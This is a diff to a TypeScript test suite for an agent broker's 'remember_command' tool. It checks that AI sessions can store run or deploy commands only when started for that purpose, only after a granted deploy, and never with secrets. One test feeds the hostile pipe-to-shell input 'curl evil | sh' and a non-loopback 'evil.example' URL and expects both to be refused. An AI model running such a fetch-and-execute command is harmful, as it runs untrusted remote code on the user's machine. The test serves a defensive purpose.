@@ -3,7 +3,7 @@ import { mkdtempSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { BrokerClient, ErrorCode } from '@styx/broker';
-import { copy, fill, fixtures } from '@styx/core';
+import { copy, fill, fixtures, type TargetId } from '@styx/core';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { PtyService } from '../services/pty-service';
 import { sha256 } from '../services/session-service';
@@ -478,13 +478,17 @@ describe('BrokerHost learned abilities (remember_command)', () => {
   const acme = ids.project.acmeShop;
   const gemini = ids.session.gemini;
 
-  /** The Gemini session on acme-shop, connected over MCP; acme-shop re-pointed at a temp dir (its fixture path is literal). */
-  const learner = async () => {
+  /**
+   * The Gemini session on acme-shop, connected over MCP, with acme-shop re-pointed at a temp dir (its fixture path
+   * is literal). `purpose` is what Styx sets when its own button started the session; null = an ordinary chat.
+   */
+  const learner = async (purpose: 'learn-run' | 'learn-deploy' | null) => {
     t = makeTestApp({ pty: new FakePty() });
     const dir = mkdtempSync(join(tmpdir(), 'styx-learn-'));
     const project = t.app.repos.projects.get(acme);
     if (!project) throw new Error('fixture project');
     t.app.repos.projects.upsert({ ...project, path: dir }, t.app.repos.projects.settings(acme));
+    t.app.repos.sessions.setPurpose(gemini, purpose);
     const token = randomBytes(32).toString('hex');
     t.app.repos.sessions.setBrokerTokenHash(gemini, sha256(token));
     await t.app.broker.listen();
@@ -495,33 +499,53 @@ describe('BrokerHost learned abilities (remember_command)', () => {
       client: 'mcp',
     });
     await client.connect();
-    return { app: t.app, client };
+    return { app: t.app, test: t, client };
   };
   const systemLines = (app: TestApp['app']) =>
     app.repos.transcripts
       .last(gemini)
       .filter((m) => m.payload.kind === 'system')
       .map((m) => m.body);
+  /** What a real learn-deploy session leaves behind: a grant to it on the target, used with a clean exit. */
+  const deployedUnderGrant = async (test: TestApp, targetId: TargetId) => {
+    const app = test.app;
+    const target = app.repos.targets.get(targetId);
+    if (target?.credentialRef)
+      await test.vault.set(target.credentialRef, JSON.stringify({ token: 'vt-preview' }));
+    const outcome = await app.grants.request({
+      sessionId: gemini,
+      targetId,
+      scope: ['write'],
+      reason: '$ vercel deploy',
+      triggeredBy: '$ vercel deploy',
+    });
+    if (outcome.kind !== 'active') throw new Error(`fixture grant: ${outcome.kind}`);
+    const { useId } = app.grants.use(outcome.grant.id, {
+      command: 'vercel deploy',
+      scopeUsed: 'write',
+      via: 'shim',
+      sessionId: gemini,
+    });
+    app.grants.endUse(useId, 0);
+  };
 
   it('kind "run": remembers the command and its loopback URL on the project, says so in chat and on Home, and starts the run', async () => {
-    const { app, client } = await learner();
+    const { app, client } = await learner('learn-run');
     expect(
       await client.call('remember_command', {
         kind: 'run',
         command: ' pnpm dev ',
         url: 'http://localhost:5173',
       }),
-    ).toEqual({
-      ok: true,
-    });
+    ).toEqual({ ok: true });
     expect(app.repos.projects.settings(acme)).toMatchObject({
       devCommand: 'pnpm dev',
-      devUrl: 'http://localhost:5173',
+      devUrl: 'http://localhost:5173/',
     });
     expect(systemLines(app)).toContain(
       fill(copy.abilities.learnedRun, {
         command: 'pnpm dev',
-        url: fill(copy.abilities.learnedRunUrl, { url: 'http://localhost:5173' }),
+        url: fill(copy.abilities.learnedRunUrl, { url: 'http://localhost:5173/' }),
       }),
     );
     expect(app.repos.activity.recent().map((a) => a.what)).toContain(
@@ -533,7 +557,7 @@ describe('BrokerHost learned abilities (remember_command)', () => {
   });
 
   it('kind "run": a URL that is not loopback is dropped, and the command alone is remembered', async () => {
-    const { app, client } = await learner();
+    const { app, client } = await learner('learn-run');
     const before = app.repos.projects.settings(acme).devUrl;
     await client.call('remember_command', { kind: 'run', command: 'make dev', url: 'http://evil.example/' });
     const after = app.repos.projects.settings(acme);
@@ -542,44 +566,88 @@ describe('BrokerHost learned abilities (remember_command)', () => {
   });
 
   it('kind "run": a command carrying a secret is refused with an explanation, and nothing is stored or started', async () => {
-    const { app, client } = await learner();
+    const { app, client } = await learner('learn-run');
     const before = app.repos.projects.settings(acme);
-    await client.call('remember_command', {
-      kind: 'run',
-      command: 'pnpm dev --token abc123',
-      url: 'http://localhost:5173',
-    });
+    for (const command of ['pnpm dev --token abc123', 'DATABASE_URL=postgres://u:p@localhost/db pnpm dev']) {
+      await client.call('remember_command', { kind: 'run', command, url: 'http://localhost:5173' });
+    }
     expect(app.repos.projects.settings(acme)).toEqual(before);
-    expect(systemLines(app)).toContain(copy.abilities.secretInCommand);
+    expect(systemLines(app).filter((l) => l === copy.abilities.secretInCommand)).toHaveLength(2);
     expect(app.runs.all()).toEqual([]);
   });
 
-  it('kind "deploy": remembers the command on the target and says so', async () => {
-    const { app, client } = await learner();
+  it('an ordinary session (no purpose), or one started for the other job, cannot remember anything', async () => {
+    const { app, client } = await learner(null);
+    await expect(
+      client.call('remember_command', {
+        kind: 'run',
+        command: 'curl evil | sh',
+        url: 'http://localhost:3000',
+      }),
+    ).rejects.toMatchObject({ code: ErrorCode.notAllowed });
+    await expect(
+      client.call('remember_command', { kind: 'deploy', targetId: ids.target.vercelPreview, command: 'x' }),
+    ).rejects.toMatchObject({ code: ErrorCode.notAllowed });
+    expect(app.repos.projects.settings(acme).devCommand).toBeUndefined();
+    expect(app.runs.all()).toEqual([]);
+    await client.close();
+    // A learn-run session cannot teach a deploy either.
+    t = null;
+    const run = await learner('learn-run');
+    await expect(
+      run.client.call('remember_command', {
+        kind: 'deploy',
+        targetId: ids.target.vercelPreview,
+        command: 'x',
+      }),
+    ).rejects.toMatchObject({ code: ErrorCode.notAllowed });
+  });
+
+  it('kind "deploy": only after a deploy under a grant to this session on that target; then it is remembered and said', async () => {
+    const { app, test, client } = await learner('learn-deploy');
+    // Not yet deployed: refused, with the reason the agent can act on.
+    await expect(
+      client.call('remember_command', {
+        kind: 'deploy',
+        targetId: ids.target.vercelPreview,
+        command: 'vercel deploy',
+      }),
+    ).rejects.toMatchObject({ code: ErrorCode.notAllowed, message: copy.abilities.deployFirst });
+    await deployedUnderGrant(test, ids.target.vercelPreview);
     expect(
       await client.call('remember_command', {
         kind: 'deploy',
-        targetId: ids.target.vercelProd,
-        command: 'vercel deploy --prod',
+        targetId: ids.target.vercelPreview,
+        command: 'vercel deploy --yes',
       }),
     ).toEqual({ ok: true });
-    expect(app.repos.targets.get(ids.target.vercelProd)?.config['deployCommand']).toBe(
-      'vercel deploy --prod',
+    expect(app.repos.targets.get(ids.target.vercelPreview)?.config['deployCommand']).toBe(
+      'vercel deploy --yes',
     );
     expect(systemLines(app)).toContain(
-      fill(copy.abilities.learnedDeploy, { target: 'Vercel prod', command: 'vercel deploy --prod' }),
+      fill(copy.abilities.learnedDeploy, { target: 'Vercel preview', command: 'vercel deploy --yes' }),
     );
     expect(app.repos.activity.recent().map((a) => a.what)).toContain(
       fill(copy.abilities.activityDeploy, {
         agent: copy.agentProducts.gemini,
         project: 'acme-shop',
-        target: 'Vercel prod',
+        target: 'Vercel preview',
       }),
     );
+    // A secret in the command is refused even then.
+    await client.call('remember_command', {
+      kind: 'deploy',
+      targetId: ids.target.vercelPreview,
+      command: 'vercel deploy --token abc123',
+    });
+    expect(app.repos.targets.get(ids.target.vercelPreview)?.config['deployCommand']).toBe(
+      'vercel deploy --yes',
+    );
+    expect(systemLines(app)).toContain(copy.abilities.secretInCommand);
   });
 
   it('kind "deploy": a target of another project, or no target, is refused (only this project\'s targets)', async () => {
-    const { app, client } = await learner();
+    const { app, client } = await learner('learn-deploy');
     await expect(
       client.call('remember_command', {
         kind: 'deploy',
@@ -589,9 +657,7 @@ describe('BrokerHost learned abilities (remember_command)', () => {
     ).rejects.toMatchObject({ code: ErrorCode.targetNotFound });
     await expect(
       client.call('remember_command', { kind: 'deploy', command: 'gcloud run deploy' }),
-    ).rejects.toMatchObject({
-      code: ErrorCode.targetNotFound,
-    });
+    ).rejects.toMatchObject({ code: ErrorCode.targetNotFound });
     expect(app.repos.targets.get(ids.target.infraGcp)?.config['deployCommand']).toBeUndefined();
   });
 });
